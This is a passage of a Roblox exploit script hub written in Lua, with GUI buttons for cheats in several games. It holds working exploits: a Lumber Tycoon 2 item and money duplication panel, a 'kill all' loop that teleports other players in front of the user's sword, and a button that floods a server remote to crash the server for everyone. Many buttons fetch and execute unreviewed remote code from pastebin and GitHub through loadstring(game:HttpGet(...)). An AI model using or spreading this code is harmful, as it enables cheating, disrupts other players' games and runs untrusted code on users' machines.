duper.Position = UDim2.new(0.712204456, 0, 0.644543827, 0)
duper.Size = UDim2.new(0, 114, 0, 40)
duper.Font = Enum.Font.Cartoon
duper.Text = "Duper"
duper.TextColor3 = Color3.fromRGB(255, 255, 255)
duper.TextSize = 20.000
duper.TextWrapped = true
duper.MouseButton1Down:connect(function()
-- Objects
 
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local SaveSlot = Instance.new("TextButton")
local DMoney = Instance.new("TextButton")
local Store = Instance.new("TextButton")
local Restore = Instance.new("TextButton")
local DropAxes = Instance.new("TextButton")
local Load = Instance.new("TextButton")
local CountAxes = Instance.new("TextButton")
local Slot = Instance.new("TextBox")
 
-- Properties
 
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
MainFrame.Name = "LT2DupeGui"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.new(0.282353, 0.278431, 0.278431)
MainFrame.BorderColor3 = Color3.new(0.588235, 0.588235, 0.588235)
MainFrame.BorderSizePixel = 3
MainFrame.Position = UDim2.new(0.111687116, 0, 0.167118713, 0)
MainFrame.Size = UDim2.new(0, 230, 0, 258)
MainFrame.Active = true
MainFrame.Draggable = true
 
SaveSlot.Name = "SaveSlot"
SaveSlot.Parent = MainFrame
SaveSlot.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
SaveSlot.BorderSizePixel = 2
SaveSlot.Position = UDim2.new(0.040079806, 0, 0.302941561, 0)
SaveSlot.Size = UDim2.new(0, 95, 0, 40)
SaveSlot.Font = Enum.Font.SourceSans
SaveSlot.Text = "Save Slot"
SaveSlot.TextColor3 = Color3.new(0, 0, 0)
SaveSlot.TextSize = 14
 
DMoney.Name = "DMoney"
DMoney.Parent = MainFrame
DMoney.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
DMoney.BorderSizePixel = 2
DMoney.Position = UDim2.new(0.0410686359, 0, 0.774269283, 0)
DMoney.Size = UDim2.new(0, 95, 0, 40)
DMoney.Font = Enum.Font.SourceSans
DMoney.Text = "Dupe Money"
DMoney.TextColor3 = Color3.new(0, 0, 0)
DMoney.TextSize = 14
 
Store.Name = "Store"
Store.Parent = MainFrame
Store.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
Store.BorderSizePixel = 2
Store.Position = UDim2.new(0.514908552, 0, 0.299316287, 0)
Store.Size = UDim2.new(0, 95, 0, 40)
Store.Font = Enum.Font.SourceSans
Store.Text = "Store Axe"
Store.TextColor3 = Color3.new(0, 0, 0)
Store.TextSize = 14
 
Restore.Name = "Restore"
Restore.Parent = MainFrame
Restore.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
Restore.BorderSizePixel = 2
Restore.Position = UDim2.new(0.51270771, 0, 0.528562546, 0)
Restore.Size = UDim2.new(0, 95, 0, 40)
Restore.Font = Enum.Font.SourceSans
Restore.Text = "Restore Axe"
Restore.TextColor3 = Color3.new(0, 0, 0)
Restore.TextSize = 14
 
DropAxes.Name = "Drop Axes"
DropAxes.Parent = MainFrame
DropAxes.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
DropAxes.BorderSizePixel = 2
DropAxes.Position = UDim2.new(0.514981687, 0, 0.774269283, 0)
DropAxes.Size = UDim2.new(0, 95, 0, 40)
DropAxes.Font = Enum.Font.SourceSans
DropAxes.Text = "Drop Axes"
DropAxes.TextColor3 = Color3.new(0, 0, 0)
DropAxes.TextSize = 14
 
Load.Name = "Load"
Load.Parent = MainFrame
Load.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
Load.BorderSizePixel = 2
Load.Position = UDim2.new(0.0410686135, 0, 0.530083239, 0)
Load.Size = UDim2.new(0, 95, 0, 40)
Load.Font = Enum.Font.SourceSans
Load.Text = "Load Slot"
Load.TextColor3 = Color3.new(0, 0, 0)
Load.TextSize = 14
 
CountAxes.Name = "Count Axes"
CountAxes.Parent = MainFrame
CountAxes.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
CountAxes.BorderSizePixel = 2
CountAxes.Position = UDim2.new(0.510633886, 0, 0.0688429475, 0)
CountAxes.Size = UDim2.new(0, 95, 0, 40)
CountAxes.Font = Enum.Font.SourceSans
CountAxes.Text = "Count Axes"
CountAxes.TextColor3 = Color3.new(0, 0, 0)
CountAxes.TextSize = 14
 
Slot.Name = "Slot"
Slot.Parent = MainFrame
Slot.BackgroundColor3 = Color3.new(0.411765, 0.411765, 0.411765)
Slot.BorderSizePixel = 2
Slot.Position = UDim2.new(0.0410686322, 0, 0.0697674453, 0)
Slot.Size = UDim2.new(0, 94, 0, 39)
Slot.Font = Enum.Font.SourceSans
Slot.Text = "Slot Number"
Slot.TextColor3 = Color3.new(0, 0, 0)
Slot.TextSize = 14
 
--Locals
local MoneyCooldown = false
local CurrentSlot = game.Players.LocalPlayer:WaitForChild("CurrentSaveSlot").Value
local ScriptLoadOrSave = false
local CurrentlySavingOrLoading = game.Players.LocalPlayer:WaitForChild("CurrentlySavingOrLoading")
 
--Functions
local function CheckIfSlotAvailable(Slot)
    for a,b in pairs(game.ReplicatedStorage.LoadSaveRequests.GetMetaData:InvokeServer(game.Players.LocalPlayer)) do
        if a == Slot then
            for c,d in pairs(b) do
                if c == "NumSaves" and d ~= 0 then
                    return true
                else
                    return false
                end
            end
        end
    end
end
 
local function CheckSlotNumber() --Checks if the slot number is right
    if Slot.Text == "1" or Slot.Text == "2" or Slot.Text == "3" or Slot.Text == "4" or Slot.Text == "5" or Slot.Text == "6" then
        local SlotNumber = tonumber(Slot.Text)
        return SlotNumber
        else return false
    end
end
 
local function SendNotification(Title,Text,Duration) -- Sends Notification in the bottom right of the screen
    game.StarterGui:SetCore("SendNotification", {
        Title = Title;
        Text = Text;
        Icon = nil;
        Duration = Duration
    })
end
 
SaveSlot.MouseButton1Down:connect(function() --Saves the slot that you want
    local CheckSlot = CheckSlotNumber()
    if CheckSlot ~= false then
        if CurrentSlot ~= -1 then
            ScriptLoadOrSave = true
            local SaveSlot = game.ReplicatedStorage.LoadSaveRequests.RequestSave:InvokeServer(CheckSlot)
            if SaveSlot == true then
                SendNotification("Save Notification", "Saved your Slot", 2)
                wait(.5)
                ScriptLoadOrSave = false
            elseif SaveSlot == false then
                SendNotification("Already Saving", "Saving/Loading is currently in Progress", 1)
                wait(.5)
                ScriptLoadOrSave = false
            end
        else
            SendNotification("Error", "Load Your Slot First before saving", 1)
        end
    else
        SendNotification("Incorrect Slot", "Enter a number in the upper field", 1)
    end
end)
 
Load.MouseButton1Down:connect(function() --Loads the slot you want
    ScriptLoadOrSave = true
    local CheckSlot = CheckSlotNumber()
    if CheckSlot ~= false then
        if CheckIfSlotAvailable(CheckSlot) == true then
            local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(CheckSlot)
            if LoadSlot == false then
                SendNotification("Cooldown Notification", "You aren't abled to load now", 1)
            end
            if LoadSlot == true then
                SendNotification("Reload Notification", "Loaded Your Slot", 2)
                CurrentSlot = CheckSlot
            end
        else
            SendNotification("Slot not Available", "This Slot is not Available, please choose another slot", 2)
        end
    else
        SendNotification("Incorrect Slot", "Enter a Valid number in the upper field", 1)
    end
    ScriptLoadOrSave = false
end)
 
Store.MouseButton1Down:connect(function() --Stores the Axes somewhere so you can restore them later
    Amount = 0
    for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
        if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
            b.Parent = game.Players.LocalPlayer
            Amount = Amount + 1
        end
    end
    SendNotification("Store Notification", "Stored "..Amount.." Axes, you can restore them later", 2)
end)
 
Restore.MouseButton1Down:connect(function() --Restores the axes that you stored with the Store function
    Amount = 0
    for a,b in pairs(game.Players.LocalPlayer:GetChildren()) do
        if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
            b.Parent = game.Players.LocalPlayer.Backpack
            Amount = Amount + 1
        end
    end
    SendNotification("Restore Notification", "Restored "..Amount.." Axes that you Stored", 2)
end)
 
CountAxes.MouseButton1Down:connect(function() --Counts Axes in your Backpack (Equiped Axes dont Count)
    Amount = 0
    for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
            Amount = Amount + 1
        end
    end
    SendNotification("Axe Amount", "You have "..Amount.." Axes in your Backpack",2)
end)
 
DropAxes.MouseButton1Down:connect(function() --Drops all your Axes
    Amount = 0
    for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
            game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(b, "Drop tool", game.Players.LocalPlayer.Character.Head.CFrame)
            Amount = Amount + 1
        end
    end
    SendNotification("Axe Dropped", "Dropped "..Amount.." Axes from your Backpack",5)
end)
 
DMoney.MouseButton1Down:connect(function() --Sends the money and will come back after around 2 mins
    if MoneyCooldown == true then
        SendNotification("Cooldown Notification", "Wait for your Money to come back",2)
        return
    elseif MoneyCooldown == false then
        MoneyCooldown = true
        SendNotification("Money Sent", "Wait about 2 minutes for your Money to come back", 5)
        game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
        SendNotification("Money Received", "You received your money that you have sent earlier", 5)
        MoneyCooldown = false
    end
end)
 
--Anti Overwrite Slot (Sub-Function)
while wait(.15) do
    if CurrentlySavingOrLoading.Value == true and ScriptLoadOrSave == false then
        repeat
        wait(1)
        until CurrentlySavingOrLoading.Value == false
        wait(1)
        CurrentSlot = game.Players.LocalPlayer.CurrentSaveSlot.Value
        print(CurrentSlot)
    end
end
end)
 
ferry.Name = "ferry"
ferry.Parent = Main
ferry.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ferry.Position = UDim2.new(0.0627705604, 0, 0.644543827, 0)
ferry.Size = UDim2.new(0, 114, 0, 40)
ferry.Font = Enum.Font.Cartoon
ferry.Text = "Ferry"
ferry.TextColor3 = Color3.fromRGB(255, 255, 255)
ferry.TextSize = 20.000
ferry.TextWrapped = true
ferry.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/D46E1PYw'),true))()
end)
 
pinkwires.Name = "pinkwires"
pinkwires.Parent = Main
pinkwires.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
pinkwires.Position = UDim2.new(0.390442908, 0, 0.644543827, 0)
pinkwires.Size = UDim2.new(0, 114, 0, 40)
pinkwires.Font = Enum.Font.Cartoon
pinkwires.Text = "Pink Wires"
pinkwires.TextColor3 = Color3.fromRGB(255, 255, 255)
pinkwires.TextSize = 20.000
pinkwires.TextWrapped = true
pinkwires.MouseButton1Down:connect(function()
-- Objects
 
local WireChanger = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Decor = Instance.new("TextButton")
local Execute = Instance.new("TextButton")
local Type = Instance.new("TextButton")
local ALabel2 = Instance.new("TextLabel")
local ALabel1 = Instance.new("TextLabel")
local Note = Instance.new("TextLabel")
local Creds = Instance.new("TextLabel")
 
-- Properties
 
WireChanger.Name = "WireChanger"
WireChanger.Parent = game.StarterGui
 
Frame.Parent = WireChanger
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.360576928, 0)
Frame.Size = UDim2.new(0.250678748, 0, 0.298076928, 0)
 
Decor.Name = "Decor"
Decor.Parent = Frame
Decor.Active = false
Decor.BackgroundColor3 = Color3.new(1, 1, 1)
Decor.BorderSizePixel = 0
Decor.Position = UDim2.new(-0.0719999969, 0, -0, 0)
Decor.Size = UDim2.new(1.06859207, 0, 1, 0)
Decor.AutoButtonColor = false
Decor.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Decor.Font = Enum.Font.SourceSans
Decor.FontSize = Enum.FontSize.Size14
Decor.Text = ""
Decor.TextSize = 14
 
Execute.Name = "Execute"
Execute.Parent = Frame
Execute.Active = false
Execute.BackgroundColor3 = Color3.new(0.333333, 1, 0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.108303249, 0, 0.806451619, 0)
Execute.Size = UDim2.new(0.707581222, 0, 0.118279569, 0)
Execute.AutoButtonColor = false
Execute.Font = Enum.Font.SourceSans
Execute.FontSize = Enum.FontSize.Size14
Execute.Text = "Run Process"
Execute.TextColor3 = Color3.new(1, 1, 1)
Execute.TextScaled = true
Execute.TextSize = 14
Execute.TextWrapped = true
 
Type.Name = "Type"
Type.Parent = Frame
Type.Active = false
Type.BackgroundColor3 = Color3.new(1, 1, 1)
Type.Position = UDim2.new(0.108303249, 0, 0.440860212, 0)
Type.Size = UDim2.new(0.0830324888, 0, 0.118279569, 0)
Type.AutoButtonColor = false
Type.Font = Enum.Font.SourceSans
Type.FontSize = Enum.FontSize.Size14
Type.Text = ""
Type.TextColor3 = Color3.new(1, 1, 1)
Type.TextScaled = true
Type.TextSize = 14
Type.TextWrapped = true
 
ALabel2.Name = "ALabel2"
ALabel2.Parent = Frame
ALabel2.BackgroundColor3 = Color3.new(1, 1, 1)
ALabel2.BackgroundTransparency = 1
ALabel2.Position = UDim2.new(0.212996393, 0, 0.408602148, 0)
ALabel2.Size = UDim2.new(0.707581222, 0, 0.182795703, 0)
ALabel2.Font = Enum.Font.SourceSans
ALabel2.FontSize = Enum.FontSize.Size14
ALabel2.Text = "What wire type? (On is Pink, Off is Magenta Icicle)"
ALabel2.TextScaled = true
ALabel2.TextSize = 14
ALabel2.TextWrapped = true
 
ALabel1.Name = "ALabel1"
ALabel1.Parent = Frame
ALabel1.BackgroundColor3 = Color3.new(1, 1, 1)
ALabel1.BackgroundTransparency = 1
ALabel1.Position = UDim2.new(0, 0, 0.0322580636, 0)
ALabel1.Size = UDim2.new(0.967509031, 0, 0.252688169, 0)
ALabel1.Font = Enum.Font.SourceSans
ALabel1.FontSize = Enum.FontSize.Size14
ALabel1.Text = "To use, Simply buy some Wire from Links Logic or Wood R Us place them then run the script!"
ALabel1.TextScaled = true
ALabel1.TextSize = 14
ALabel1.TextWrapped = true
 
Note.Name = "Note"
Note.Parent = Frame
Note.BackgroundColor3 = Color3.new(1, 1, 1)
Note.BackgroundTransparency = 1
Note.Position = UDim2.new(0, 0, 1, 0)
Note.Size = UDim2.new(0.967509031, 0, 0.252688169, 0)
Note.Font = Enum.Font.SourceSans
Note.FontSize = Enum.FontSize.Size14
Note.Text = "After script is ran, you will have to rejoin LT2."
Note.TextColor3 = Color3.new(1, 1, 1)
Note.TextScaled = true
Note.TextSize = 14
Note.TextStrokeTransparency = 0.5
Note.TextWrapped = true
 
Creds.Name = "Creds"
Creds.Parent = Frame
Creds.BackgroundColor3 = Color3.new(1, 1, 1)
Creds.BackgroundTransparency = 1
Creds.Position = UDim2.new(0, 0, -0.252688169, 0)
Creds.Size = UDim2.new(0.967509031, 0, 0.252688169, 0)
Creds.Font = Enum.Font.SourceSans
Creds.FontSize = Enum.FontSize.Size14
Creds.Text = "Made by: goldenaxelord\nOriginal Script: VIP Server"
Creds.TextColor3 = Color3.new(1, 1, 1)
Creds.TextScaled = true
Creds.TextSize = 14
Creds.TextStrokeTransparency = 0.5
Creds.TextWrapped = true
-- SCRIPTS START HERE
WireChanger.Parent = game.Players.LocalPlayer.PlayerGui
 
local typecurrent = false
-- on = pink, off = icicle
Type.MouseButton1Down:connect(function(changeTheType)
	if typecurrent == true then
		typecurrent = false
		Type.BackgroundColor3 = Color3.new(255/255, 255/255, 255/255)
	elseif typecurrent == false then
		typecurrent = true
		Type.BackgroundColor3 = Color3.new(85/255, 255/255, 0/255)
	end
end)
 
Execute.MouseButton1Down:connect(function(ChangeTheWire)
if typecurrent == true then
local a = game.ReplicatedStorage.Purchasables:FindFirstChild("NeonWirePinky", true)
a.Name = "Wire"
local b = game.ReplicatedStorage.Purchasables:FindFirstChild("Wire", true)
b:Destroy()
elseif typecurrent == false then
local c = game.ReplicatedStorage.Purchasables:FindFirstChild("IcicleWireMagenta", true)
c.Name = "Wire"
local d = game.ReplicatedStorage.Purchasables:FindFirstChild("Wire", true)
d:Destroy()
end
end)
end)
end
})
Tab:AddButton({
	Name = "BF",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
end
})
Tab:AddButton({
	Name = "极速传奇刷宠物",
	Callback = function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Script%20Game"))()
end
})
Tab:AddButton({
	Name = "指令(inf)",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end
})
Tab:AddButton({
	Name = "小偷模拟器",
	Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/adrician/Thief-Simulator---GUI/main/Thief%20sim.lua"),true))()
end
})
Tab:AddButton({
	Name = "26种游戏脚本",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
end
})
Tab:AddButton({
	Name = "杀死所有人",
	Callback = function()
-- You MUST have a sword for this to work.
-- This only works on sword fighting games like Crossroads, Sword Fight on Bridge, and Fencing (if players are on the black mat)
-- All you have to do is press the "Kill All" button, and then take out your sword and click to kill everyone, and you're done! :)

-- Objects

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

-- Properties

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(1, 0.388235, 0.368627)
Frame.BorderColor3 = Color3.new(0.67451, 0.211765, 0.152941)
Frame.Position = UDim2.new(0.293040276, 0, 0.491666675, 0)
Frame.Size = UDim2.new(0.106227107, 0, 0.0833333284, 0)
Frame.Active = true
Frame.Draggable = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.BackgroundTransparency = 0.80000001192093
TextButton.Position = UDim2.new(0.103524067, 0, 0.200333327, 0)
TextButton.Size = UDim2.new(0.793684483, 0, 0.601000011, 0)
TextButton.Font = Enum.Font.SourceSansLight
TextButton.FontSize = Enum.FontSize.Size14
TextButton.Text = "Kill All"
TextButton.TextScaled = true
TextButton.TextSize = 14
TextButton.TextWrapped = true

run = false
TextButton.MouseButton1Click:connect(function()
run = not run
local function tp()
for i, player in ipairs(game.Players:GetChildren()) do
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
end
end
end
if run then
while wait() do
if run then
tp()
end
end
end
end)
end
})
Tab:AddButton({
	Name = "rooms&doors可执行列表",
	Callback = function()
loadstring(game:HttpGet("https://shz.al/7T2drEK6RBhrypanykZi7Fh5"))()
end
})
Tab:AddButton({
	Name = "FE动画中心",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end
})
Tab:AddButton({
	Name = "solsRNG(没有卡密)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
end
})
Tab:AddButton({
	Name = "服务器崩溃(使所有人ping值越来越高)",
	Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

game:GetService'RunService'.RenderStepped:Connect(function()
task.spawn(function() -- prevent blocking frame render
for i=0,1000,1 do
    
local args = {
    [1] = {
        [1] = "Wear",
        [2] = "11297746",
        [3] = "Hats"
    }
}

game:GetService("ReplicatedStorage").WearItem:FireServer(unpack(args))
end
end)
end)
end
})
Tab:AddButton({
	Name = "俄亥俄州(ohio)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rxn-xyz/Ohio./main/Ohio.lua",true))()
end
})
Tab:AddButton({
	Name = "造船寻宝，复制别人的船",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/autobuild.txt"))()
end
})
    else
        game.Players.LocalPlayer:Kick("卡密枫114514快去检测吧")
    end
end)
    end)
end
local myTitle = "注意" 
CreateGUI(myTitle)